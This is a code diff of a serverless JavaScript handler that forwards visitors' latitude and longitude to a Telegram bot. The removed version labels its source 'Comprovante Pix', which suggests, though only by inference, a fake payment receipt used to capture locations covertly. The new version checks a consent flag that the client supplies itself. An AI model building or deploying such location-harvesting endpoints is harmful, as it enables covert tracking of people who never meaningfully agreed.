@@ -1,55 +1,118 @@
-const axios = require("axios");
 
-module.exports = async (req, res) => {
-  // Permitir requisições do front-end (CORS)
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+export default async function handler(req, res) {
 
-  if (req.method === 'OPTIONS') {
-    return res.status(200).end();
-  }
+    // Aceita somente POST
+    if (req.method !== "POST") {
+        res.setHeader("Allow", "POST");
 
-  if (req.method !== "POST") {
-    return res.status(405).json({ success: false, message: "Método não permitido" });
-  }
+        return res.status(405).json({
+            success: false,
+            error: "Método não permitido"
+        });
+    }
 
-  const { latitude, longitude, source, maps } = req.body;
+    try {
+        const {
+            latitude,
+            longitude,
+            consentimento
+        } = req.body || {};
 
-  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+        // Exige confirmação expressa enviada pelo site
+        if (consentimento !== true) {
+            return res.status(403).json({
+                success: false,
+                error: "Compartilhamento não autorizado"
+            });
+        }
 
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    return res.status(500).json({ success: false, message: "Tokens do Telegram não configurados na Vercel." });
-  }
+        // Converte e valida as coordenadas
+        const lat = Number(latitude);
+        const lon = Number(longitude);
 
-  if (!latitude || !longitude) {
-    return res.status(400).json({ success: false, message: "Latitude e longitude obrigatórias." });
-  }
+        if (
+            !Number.isFinite(lat) ||
+            !Number.isFinite(lon) ||
+            lat < -90 ||
+            lat > 90 ||
+            lon < -180 ||
+            lon > 180
+        ) {
+            return res.status(400).json({
+                success: false,
+                error: "Coordenadas inválidas"
+            });
+        }
 
-  try {
-    const formattedLatitude = parseFloat(latitude.toFixed(6));
-    const formattedLongitude = parseFloat(longitude.toFixed(6));
+        // Credenciais armazenadas na Vercel
+        const TELEGRAM_BOT_TOKEN =
+            process.env.TELEGRAM_BOT_TOKEN;
 
-    // 1. Envia a localização exata (mapa interativo) para o Telegram
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
-      chat_id: TELEGRAM_CHAT_ID,
-      latitude: formattedLatitude,
-      longitude: formattedLongitude
-    });
+        const TELEGRAM_CHAT_ID =
+            process.env.TELEGRAM_CHAT_ID;
 
-    // 2. Envia a mensagem de texto com os detalhes
-    const message = `📍 Localização recebida\nFonte: ${source || 'Comprovante Pix'}\nMaps: https://www.google.com/maps?q=${formattedLatitude},${formattedLongitude}\nLatitude: ${formattedLatitude}\nLongitude: ${formattedLongitude}`;
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+            console.error("Variáveis do Telegram não configuradas.");
 
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message
-    });
+            return res.status(500).json({
+                success: false,
+                error: "Integração do Telegram não configurada"
+            });
+        }
 
-    return res.status(200).json({ success: true, message: "Enviado com sucesso!" });
+        const maps =
+            `https://www.google.com/maps?q=${lat},${lon}`;
 
-  } catch (error) {
-    console.error("Erro ao enviar para o Telegram:", error.response?.data || error.message);
-    return res.status(500).json({ success: false, message: "Erro ao enviar para o Telegram." });
-  }
-};
+        const mensagem =
+            "📍 BOLA EM FOCO — LOCALIZAÇÃO COMPARTILHADA\n\n" +
+            "O visitante autorizou expressamente o compartilhamento da localização.\n\n" +
+            `Latitude: ${lat}\n` +
+            `Longitude: ${lon}\n\n` +
+            `Visualizar no Google Maps:\n${maps}`;
+
+        const telegramUrl =
+            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        const resposta = await fetch(telegramUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: mensagem,
+                disable_web_page_preview: true
+            })
+        });
+
+        const resultado = await resposta.json();
+
+        if (!resposta.ok || resultado.ok !== true) {
+            console.error(
+                "Erro retornado pelo Telegram:",
+                resultado
+            );
+
+            return res.status(502).json({
+                success: false,
+                error: "O Telegram não confirmou o envio"
+            });
+        }
+
+        console.log("Localização enviada ao Telegram.");
+
+        return res.status(200).json({
+            success: true,
+            message: "Localização enviada com sucesso"
+        });
+
+    } catch (erro) {
+
+        console.error("Erro interno:", erro);
+
+        return res.status(500).json({
+            success: false,
+            error: "Erro interno no servidor"
+        });
+    }
+}
